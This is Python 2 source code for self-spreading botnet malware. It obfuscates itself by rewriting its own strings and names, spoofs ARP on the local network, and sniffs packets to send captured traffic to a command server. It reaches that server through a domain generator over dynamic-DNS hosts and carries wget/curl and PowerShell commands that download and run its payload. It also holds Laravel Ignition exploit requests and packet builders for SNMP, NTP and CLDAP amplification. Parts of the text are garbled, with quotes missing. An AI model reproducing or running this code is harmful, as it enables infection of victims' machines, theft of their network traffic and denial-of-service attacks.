#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import re,socket,subprocess,os,sys,urllib,urllib2,time,threading,random,itertools,platform,multiprocessing,select,ssl,struct,ast,zlib,gzip,array,tarfile
from hashlib import sha512
from binascii import unhexlify
from base64 import b64decode,b64encode
from uuid import getnode
global sBaWUngcWw,NvXZxSdY,zVcZlhbxaug,fhbOTakGi,YLbXihJLQap,PsWiuIgGFCV,ocodSLPIboj,aglKdYah,ports,validserver,VdqQKydogMq,CBCJyLbhD,WMiBcGbzLiZ,EkcvdRbW,maxssh,currssh,toracuciFgIirc,toracuciFgIsec,akvKEodYh
akvKEodYh = '\x65hhhhFuckSpyTechUsersWeDaMilitiaAnonym00se'
def SlHhRejXDa(s):
    global akvKEodYh
    return ''.join([chr(ord(c) ^ ord(akvKEodYh[i % len(akvKEodYh)])) for i, c in enumerate(s)])
if os.name == 'nt':
    import webbrowser, shutil, psutil
    from ctypes import *
    from _winreg import *
    from win32event import CreateMutex
    from win32api import GetLastError,GetCommandLine
    from winerror import ERROR_ALREADY_EXISTS
else:
    import fcntl
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO
sys.stdout = sys.stderr = open(os.devnull,'wb')
ports = [80, 443, 8081, 8081, 7001]
Addresses = [107.150.8.170:9051,95.217.251.233:1080,5.130.184.36:9999,83.234.161.187:9999,185.186.240.37:9119,5.61.53.57:9500,23.237.60.122:9051,185.82.217.167:9051,78.153.5.183:666,51.210.202.187:8425,85.159.44.163:9050,217.12.221.85:9051,130.61.153.38:9050,142.93.143.155:9010,8.209.253.198:9000,127.0.0.1:9050]
YLbXihJLQap=5
PsWiuIgGFCV=6
zVcZlhbxaug = []
WMiBcGbzLiZ = ""
CBCJyLbhD = ""
aglKdYah = -1
global FAozAuHBacRN
try:
    import paramiko
    FAozAuHBacRN=True
    ports.insert(0, 22)
except ImportError:
    FAozAuHBacRN=False
MjZCcxJid = [6697, 587, 23, 443, 37215, 53, 22, 443, 37215]
DgWVkccUXHgq = {
    '\x73\x6e\x6d\x70':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'),  
    '\x6e\x74\x70':('\x17\x00\x02\x2a'+'\x00'*4),
    '\x63\x6c\x64\x61\x70':('\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00'),
}
global VdqQKydogMq
try:
    AqmQxXozc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    AqmQxXozc.connect((1.0.0.1, 53))
    VdqQKydogMq=AqmQxXozc.getsockname()[0]
    AqmQxXozc.close()
except:
    VdqQKydogMq=""
def mPakocnIXVUR():
    xoGqIVFI=[]
    fh=open(/proc/net/arp, "rb")
    wePHcypxXB=fh.readlines()
    fh.close()
    wePHcypxXB.pop(0)
    for x in wePHcypxXB:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != VdqQKydogMq:
                xoGqIVFI.append((x[0], x[3]))
    return xoGqIVFI
def CVoqPEPhdPuw():
    dvNvBXhm = hex(getnode())[2:-1]
    while (len(dvNvBXhm) != 12):
        dvNvBXhm = "0" + dvNvBXhm
    return unhexlify(dvNvBXhm)
global OFwciSvZq
OFwciSvZq=CVoqPEPhdPuw().encode('hex')
def WyoXoSeomDWE():
    with open(/proc/net/route) as fh:
        for line in fh:
            mIOXgkSZwjK = line.strip().split()
            if mIOXgkSZwjK[1] != 00000000 or not int(mIOXgkSZwjK[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(mIOXgkSZwjK[2], 16)))
def idyyxuABowFB():
    if os.name == 'nt':
        return ""
    aCiFHmsoRf = 128 * 32
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    PTYsjIUgo = array.array('B', '\0' * aCiFHmsoRf)
    YleuduONIJU = struct.unpack('iL', fcntl.ioctl(
        s.fileno(),
        0x8912,
        struct.pack('iL', aCiFHmsoRf, PTYsjIUgo.buffer_info()[0])
    ))[0]
    wpMbNJOg = PTYsjIUgo.tostring()
    lst = []
    for i in range(0, YleuduONIJU, 40):
        lst.append(wpMbNJOg[i:i+16].split('\0', 1)[0])
    return lst
def xoGqIVFI(eNioWggK):
    global OFwciSvZq
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind((eNioWggK, 0))
    while(1):
        for qMZTTbdBo in mPakocnIXVUR():
            zbbfgFRUmZ = OFwciSvZq
            jcdMecuyhyU = qMZTTbdBo[0]
            yaehbqnSciiQ = WyoXoSeomDWE()
            foogCgbiyh = qMZTTbdBo[1]
            FoPlsaol = "\x00\x00\x00\x00\x00\x00"
            fcEeSaeWx = "\x00\x01\x08\x00\x06\x04\x00\x02"
            pDgdeGcM = "\x00\x00\x00\x00"
            XuJQQPfEXp = "\x08\x06"
            s.send(jcdMecuyhyU + zbbfgFRUmZ + XuJQQPfEXp + fcEeSaeWx+zbbfgFRUmZ + yaehbqnSciiQ
                   + FoPlsaol + foogCgbiyh + pDgdeGcM)
        time.sleep(2)
def ZULhPYEqJjL():
    if os.name == 'nt':
        return 1
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        return 0
    os.setsid()
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        return 0
    return 1
def McwSBUoubP(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
global EFCTiLDlTRA
EFCTiLDlTRA=os.path.realpath(__file__)
npsJkomP=open(EFCTiLDlTRA,"rb")
jeNOQdpaOiJ=npsJkomP.read()
npsJkomP.close()
class nKUogBciM(ast.NodeVisitor):
    def cViuTKYYWS(self, node): 
        try:
            jqijianaljVw=jeNOQdpaOiJ.split("\n")[node.lineno-1]
            pIMyBsSBImK=jqijianaljVw[node.col_offset:node.col_offset+len(node.s)+2][0]
            oDDxGcDudQOu=eval(repr(pIMyBsSBImK + "".join(jqijianaljVw[node.col_offset+1:node.col_offset+len(node.s)+len(jqijianaljVw[node.col_offset-1:node.col_offset+len(node.s)+1].split(jqijianaljVw[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4][:jqijianaljVw[node.col_offset+1:node.col_offset+len(node.s)+len(jqijianaljVw[node.col_offset-1:node.col_offset+len(node.s)+2].split(jqijianaljVw[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4].find(pIMyBsSBImK)]) + pIMyBsSBImK))
            if len(oDDxGcDudQOu)>=PsWiuIgGFCV and "\\x" not in oDDxGcDudQOu and oDDxGcDudQOu not in zVcZlhbxaug and "zlib" not in jqijianaljVw:
                zVcZlhbxaug.append(oDDxGcDudQOu)
        except:
            pass
def IWjyoXcXu(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
class JyhPiKIB(object):
    def __init__(self, SBiAXHHmMav, VZKiXWdv, fcEeSaeWx='', hhShLOMBn=socket.IPPROTO_UDP):
        self.cdAQvYaDpVYC = 4
        self.ihl = 5
        self.tos = 0
        self.tl = 20+len(fcEeSaeWx)
        self.id = 0
        self.ddNSEmQRaa = 0
        self.offset = 0
        self.ttl = 255
        self.CoXUzIWcu = hhShLOMBn
        self.McwSBUoubP = 2
        self.SBiAXHHmMav = socket.inet_aton(SBiAXHHmMav)
        self.VZKiXWdv = socket.inet_aton(VZKiXWdv)
    def wGsAXnOB(self):
        hVMjaYulfa = (self.cdAQvYaDpVYC << 4) + self.ihl
        aWcLVWnaUH = (self.ddNSEmQRaa << 13) + self.offset
        AYuADAIMdo = struct.pack(!BBHHHBBH4s4s,
                    hVMjaYulfa,
                    self.tos,
                    self.tl,
                    self.id,
                    aWcLVWnaUH,
                    self.ttl,
                    self.CoXUzIWcu,
                    self.McwSBUoubP,
                    self.SBiAXHHmMav,
                    self.VZKiXWdv)
        self.McwSBUoubP = IWjyoXcXu(AYuADAIMdo)
        AYuADAIMdo = struct.pack(!BBHHHBBH4s4s,
                    hVMjaYulfa,
                    self.tos,
                    self.tl,
                    self.id,
                    aWcLVWnaUH,
                    self.ttl,
                    self.CoXUzIWcu,
                    socket.htons(self.McwSBUoubP),
                    self.SBiAXHHmMav,
                    self.VZKiXWdv)  
        return AYuADAIMdo
class EwsBWWecxo(object):
    def __init__(self, src, dst, fcEeSaeWx=''):
        self.src = src
        self.dst = dst
        self.fcEeSaeWx = fcEeSaeWx
        self.McwSBUoubP = 0
        self.pWYMIwHfNgY = 8
    def wGsAXnOB(self, src, dst, hhShLOMBn=socket.IPPROTO_UDP):
        pWYMIwHfNgY = self.pWYMIwHfNgY + len(self.fcEeSaeWx)
        xMnvyjio = struct.pack(!4s4sBBH,
            socket.inet_aton(src), socket.inet_aton(dst), 0, 
            hhShLOMBn, pWYMIwHfNgY)
        self.McwSBUoubP = IWjyoXcXu(xMnvyjio)
        XMDNPhianRwn = struct.pack(!HHHH,
            self.src, self.dst, pWYMIwHfNgY, 0)
        return XMDNPhianRwn
def enYhURMomcJY(uzsahovUcao):
    return ''.join(random.choice(abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ) for _ in range(uzsahovUcao))
class VKgWYKnooq():
    def HaRCeUxHaVg(self, uxOSazaXMd):
        if not uxOSazaXMd:
            return False
        try:
            uxOSazaXMd.getsockname()
        except socket.error:
            return False
        try:
            uxOSazaXMd.getpeername()
        except socket.error:
            return False
        return True
    def KyhaWwUDy(self,s):
        ch = (ord(c) for c in s)
        return ''.join(('\\x%02x' % c) if c <= 255 else (\u%04x % c) for c in ch)
    def ZdqTeSvuK(self):
        sBaWUngcWw = []
        NvXZxSdY = []
        ocodSLPIboj = []
        npsJkomP=open(EFCTiLDlTRA,"rb")
        jeNOQdpaOiJ=fhbOTakGi=npsJkomP.read()
        npsJkomP.close()
        p = ast.parse(jeNOQdpaOiJ)
        nKUogBciM().visit(p)
        for EnoaqQifWSL in sorted(zVcZlhbxaug, key=len, reverse=True):
            if len(EnoaqQifWSL)>=PsWiuIgGFCV:
                try:
                    if (EnoaqQifWSL[0] == "'" and EnoaqQifWSL[-1] == "'") or (EnoaqQifWSL[0] == '"' and EnoaqQifWSL[-1] == '"'):
                        fhbOTakGi=fhbOTakGi.replace(EnoaqQifWSL, "SlHhRejXDa(zlib.decompress(\x22"+self.KyhaWwUDy(zlib.compress(SlHhRejXDa(EnoaqQifWSL[1:-1].decode('string_escape'))))+"\x22))")
                    else:
                        fhbOTakGi=fhbOTakGi.replace(EnoaqQifWSL, "SlHhRejXDa(zlib.decompress(\x22"+self.KyhaWwUDy(zlib.compress(SlHhRejXDa(eval(EnoaqQifWSL).decode('string_escape'))))+"\x22))")
                except:
                    pass
        ocodSLPIboj = [node.name for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
        sBaWUngcWw = sorted({node.id for node in ast.walk(p) if isinstance(node, ast.Name) and not isinstance(node.ctx, ast.Load)})
        for obsWnHQNl in [n for n in p.body if isinstance(n, ast.FunctionDef)]:
            NvXZxSdY.append(obsWnHQNl.name)
        ocodSLPIboj = [node for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
        for YXjhKpaovFho in ocodSLPIboj:
            for obsWnHQNl in [n for n in YXjhKpaovFho.body if isinstance(n, ast.FunctionDef)]:
                if obsWnHQNl.name != __init__ and obsWnHQNl not in NvXZxSdY:
                    NvXZxSdY.append(obsWnHQNl.name)
        PvPnpsWYc=[]
        alls=[]
        for i in range(len(NvXZxSdY)+len(sBaWUngcWw)+len(ocodSLPIboj)):
            NjXgXNiFoyuG = enYhURMomcJY(random.randint(8,12))
            while NjXgXNiFoyuG in PvPnpsWYc:
                NjXgXNiFoyuG = enYhURMomcJY(random.randint(8,12))
            PvPnpsWYc.append(NjXgXNiFoyuG)
        JDSMBGczs=0
        for dasyJiFyaHc in sorted(sBaWUngcWw, key=len, reverse=True):
            if len(dasyJiFyaHc) >= YLbXihJLQap and dasyJiFyaHc != self and not dasyJiFyaHc.startswith("__"):
                fhbOTakGi=fhbOTakGi.replace(dasyJiFyaHc, PvPnpsWYc[JDSMBGczs])
            JDSMBGczs+=1
        for obsWnHQNl in sorted(NvXZxSdY, key=len, reverse=True):
            fhbOTakGi=fhbOTakGi.replace(obsWnHQNl, PvPnpsWYc[JDSMBGczs])
            JDSMBGczs+=1
        for YXjhKpaovFho in ocodSLPIboj:
            alls.append(PvPnpsWYc[JDSMBGczs])
            fhbOTakGi=fhbOTakGi.replace(YXjhKpaovFho.name, PvPnpsWYc[JDSMBGczs])
            JDSMBGczs+=1
        oVJwUgYI=open(EFCTiLDlTRA,"wb")
        oVJwUgYI.write(fhbOTakGi)
        oVJwUgYI.close()
    def aPZxpHcGcp(self):
        global EkcvdRbW
        p = 0
        for eNioWggK in idyyxuABowFB():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sewUmxUDTH = fcntl.ioctl(s.fileno(), 0x8913, eNioWggK + '\0'*256)
                vocsUGaRLXN, = struct.unpack('H', sewUmxUDTH[16:18])
                up = vocsUGaRLXN & 1
            except:
                pass
            if up == 1:
                threading.Thread(target=xoGqIVFI, args=(eNioWggK,)).start()
                break
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except:
            return
        aRabilaoMzqZ = 0
        ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        while True:
            try:
                while self.snifferenabled == 0:
                    time.sleep(1)
                if not self.HaRCeUxHaVg(ss):
                    try:
                        ss=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ss.connect((WMiBcGbzLiZ,139))
                    except:
                        time.sleep(1)
                        continue
                XMDNPhianRwn = s.recvfrom(65565)
                aRabilaoMzqZ=aRabilaoMzqZ+1
                XMDNPhianRwn=XMDNPhianRwn[0]
                chiWIlCIPio = 14
                zaIhwKaG = XMDNPhianRwn[:chiWIlCIPio]
                ldyWQZxqU  =  struct.unpack(!6s6sH,zaIhwKaG)
                yqcJGhLGh = socket.ntohs(ldyWQZxqU[2])
                AYuADAIMdo = XMDNPhianRwn[0:20]
                GmfLEnoM = struct.unpack(!BBHHHBBH4s4s,AYuADAIMdo)
                cIYbPBfAsgib= GmfLEnoM[0] 
                cdAQvYaDpVYC = cIYbPBfAsgib >> 4 
                ih1 = cIYbPBfAsgib & 0xF
                jGcGEFIqh = ih1*4
                ttl = GmfLEnoM[5]
                CoXUzIWcu = GmfLEnoM[6]
                lQiWcccUZoL = socket.inet_ntoa(GmfLEnoM[8])
                ccNlvigxCwJ = socket.inet_ntoa(GmfLEnoM[9])
                kZRXcoAYUiaI = XMDNPhianRwn[jGcGEFIqh:jGcGEFIqh+20]
                tcph = struct.unpack(!HHLLBBHHH,kZRXcoAYUiaI)
                dSjEpIHQp = tcph[0]
                oQYHxdlPHZ = tcph[1]
                aKAWUdzojen = tcph[2]
                NVoImNAeLaNd = tcph[3]
                LuybckoNaie = tcph[4]
                BkUglAGLj = LuybckoNaie >> 4
                chpCwozdjx = jGcGEFIqh+BkUglAGLj*4
                saivuoZodA = len(XMDNPhianRwn)-chpCwozdjx
                data = XMDNPhianRwn[chpCwozdjx:]
                if len(data) > 10 and dSjEpIHQp not in MjZCcxJid and oQYHxdlPHZ not in MjZCcxJid and ccNlvigxCwJ not in self.scanips and lQiWcccUZoL not in self.scanips:
                    try:
                        ss.send("IPv"+str(cdAQvYaDpVYC)+ 
ttl:+str(ttl)+
proto:+str(CoXUzIWcu)+
srcip:+str(lQiWcccUZoL)+
dstip:+str(ccNlvigxCwJ)+

srcprt:+str(dSjEpIHQp)+
dstprt:+str(oQYHxdlPHZ)+
BEGIN
+data+
END
)
                    except:
                        pass
            except:
                pass
    def NNxdMasgLT(self, word):
        return ''.join([chr(ord(v) ^ ord(n3cr0t0r_freakout[i % 17])) for i, v in enumerate(word)])
    def __init__(self):
        global WMiBcGbzLiZ,WSSqEaoRMGzD,NabTnfhUghb,EkcvdRbW
        eIFdxTzjx=0
        while 1:
            if eIFdxTzjx>=0xFD:
                eIFdxTzjx=0
            eIFdxTzjx+=1
            random.seed(a=0xFAFFDED00001 + eIFdxTzjx)
            WMiBcGbzLiZ=(''.join(random.choice(abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) for _ in range(random.randrange(10,19)))).lower()+"."+random.choice([ddns.net,ddnsking.com,3utilities.com,bounceme.net,freedynamicdns.net,freedynamicdns.org,gotdns.ch,hopto.org,myddns.me,myftp.biz,myftp.org,myvnc.com,onthewifi.com,redirectme.net,servebeer.com,serveblog.net,servecounterstrike.com,serveftp.com,servegame.com,servehalflife.com,servehttp.com,serveirc.com,serveminecraft.net,servemp3.com,servepics.com,servequake.com,sytes.net,viewdns.net,webhop.me,zapto.org])
            try:
                zIPlAQlo=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                zIPlAQlo.sendto('\x1b'+47 * '\0',(132.163.97.1,123))
                msg,VpVUYxUocNoJ=zIPlAQlo.recvfrom(1024)
                t=struct.unpack(!12I,msg)[10] - 2208988800
                viahWjoS=lambda x : ''.join([str((x >> i) & 1) for i in range(32)])
                jYpTudoJaP=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                jYpTudoJaP.connect((WMiBcGbzLiZ, 52566))
                jYpTudoJaP.send(''.join([chr(random.randint(0,128)) if x == "0" else chr(random.randint(128,255)) for x in viahWjoS(t)]))
                QaioBoNoHkN=jYpTudoJaP.recv(32)
                FIlngzcvbc=ord(QaioBoNoHkN[-5])
                ofhIiDdWpCO=ord(QaioBoNoHkN[-4])
                iTMcEanFE=ord(QaioBoNoHkN[-3])
                NaEQaAowi=ord(QaioBoNoHkN[-2])
                oITzPDDFsD=ord(QaioBoNoHkN[-1])
                self.AviaeEPO=zlib.decompress(self.NNxdMasgLT(jYpTudoJaP.recv(FIlngzcvbc)))
                self.ADjeklE=zlib.decompress(self.NNxdMasgLT(jYpTudoJaP.recv(ofhIiDdWpCO)))
                self.botinEYahePcCAg=zlib.decompress(self.NNxdMasgLT(jYpTudoJaP.recv(iTMcEanFE)))
                self.cmdprefix=zlib.decompress(self.NNxdMasgLT(jYpTudoJaP.recv(NaEQaAowi)))
                self.injectacuciFgI=zlib.decompress(self.NNxdMasgLT(jYpTudoJaP.recv(oITzPDDFsD)))
                jYpTudoJaP.close()
                break
            except:
                continue
        random.seed(a=time.time()*os.getpid())
        self.ZdqTeSvuK()
        WSSqEaoRMGzD = cd /tmp||cd $(find / -writable -readable -executable | head -n 1);wget http://DOMAIN/setup -O setup||curl http://DOMAIN/setup -O;chmod 777 setup;./setup;wget http://DOMAIN/setup.py -O setup.py||curl http://DOMAIN/setup.py -O;chmod 777 setup.py;python2 setup.py||python2.7 setup.py||python setup.py||./setup.py.replace(DOMAIN, WMiBcGbzLiZ)
        NabTnfhUghb = "@powershell -NoProfile -ExecutionPolicy unrestricted -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/manthey/pyexe/releases/download/v18/py27.exe','python.exe');(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py','setup.py');\"&.\python.exe setup.py".replace(DOMAIN, WMiBcGbzLiZ)
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.VwkBkdwM=enYhURMomcJY(random.randrange(8,16))
        self.gLsaWmlh=0
        self.XUbvPqib=0
        self.VSoeKsdv=0
        self.AELmEnMe=0
        self.cmdprefix="."
        self.kVljQimUstats={gaybots:[0,0]}
        self.scannerenabled = 1
        self.snifferenabled = 1
        self.scanips=[]
        threading.Thread(target=self.aPZxpHcGcp).start()
        threading.Thread(target=self.MZjiCvUMFL).start()
        self.hLqhZnCt=[HAX|+platform.system()+"|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.VwkBkdwM)
        self.aRHRPteL=self.hLqhZnCt
        self.pBYbuWVq=self.VwkBkdwM
        threading.Thread(target=self.qgoSdaBM, args=()).start()
        self.GbASkEbE=[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5,
        Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11,
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2,
        Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11,
        Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5,
        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0),
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5,
        Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11,
        Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5,
        Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11,
        Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3,
        Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en],
        Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0,
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2,
        Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6,
        Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3,
        Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2),
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11,
        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727),
        Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11,
        Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1,
        Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0),
        Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02,
        Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60,
        Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0,
        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729),
        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322),
        Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729),
        Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1,
        Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1,
        Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre,
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5,
        Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0,
        Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),
        Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0,
        Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590),
        Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1),
        Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4,
        Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1,
        Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1]
        self.aosidheh={ Accept: application/json, User-Agent: random.choice(self.GbASkEbE) }
        self.leetravel={ solution:Facade\Ignition\Solutions\MakeViewVariableOptionalSolution, parameters:{ variableName:cm0s, viewFile:"" } }
        threading.Thread(target=self.yuGZRsNJbFiW, args=()).start()
        for _ in range(0xCC):
            try:
                threading.Thread(target=self.aCpPbwVJEEfT).start()
            except:
                pass
    def iDjcNalAcGul(self, sack, oqughKHhOdol, TokenNWkPj=8):
        sack.setblocking(0)
        RmcaZikpd = select.select([sack], [], [], TokenNWkPj)
        if RmcaZikpd[0]:
            data = sack.recv(oqughKHhOdol)
            return data
        return ""
    def yiyoxzRfaRj(self, url='', AhixKvXNAcB=''):
        self.leetravel[parameters][viewFile]=AhixKvXNAcB
        cvUhXUdo=0
        while 1:
            try:
                hePJMoPx=urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx)
                if hePJMoPx.getcode() != 200:
                    cvUhXUdo+=1
            except urllib2.URLError as hePJMoPx:
                if hePJMoPx.getcode() != 200:
                    cvUhXUdo+=1
            if cvUhXUdo>=10:
                break
        urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx)
        urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx)
    def create_fcEeSaeWx(url='', AhixKvXNAcB=''):
        self.leetravel[parameters][viewFile]=AhixKvXNAcB
        try:
            hePJMoPx=urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx)
        except:
            pass
        try:
            hePJMoPx=urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx)
            return False
        except urllib2.URLError as hePJMoPx:
            if hePJMoPx.getcode() == 500 and file_get_contents(+AhixKvXNAcB+')' in hePJMoPx.read():
                return True
            else:
                return False
    def aJKEkkLw(self,url='', AhixKvXNAcB=''):
        self.leetravel[parameters][viewFile]=AhixKvXNAcB
        try:
            if urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx).getcode() == 200:
                return True
        except:
            return False
    def Qjzqqfjxhvl(self, url='', AhixKvXNAcB=''):
        self.leetravel[parameters][viewFile]=AhixKvXNAcB
        try:
            urllib2.urlopen(urllib2.Request(url, json.dumps(self.leetravel), headers=self.aosidheh), context=self.ctx)
        except:
            pass
    def generate_fcEeSaeWx(self,MhniBhNK=0):
        global WSSqEaoRMGzD
